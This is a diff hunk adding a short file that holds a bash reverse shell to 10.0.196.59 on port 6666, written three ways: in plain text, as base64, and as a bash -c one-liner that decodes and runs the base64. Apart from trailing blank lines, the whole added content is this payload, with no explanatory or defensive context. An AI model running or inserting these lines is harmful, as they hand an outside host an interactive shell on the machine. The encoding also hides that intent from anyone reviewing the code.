@@ -1,0 +1,6 @@
+bash -i >& /dev/tcp/10.0.196.59/6666 0>&1
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjE5Ni41OS82NjY2IDA+JjE=
+bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjE5Ni41OS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}'
+
+
+
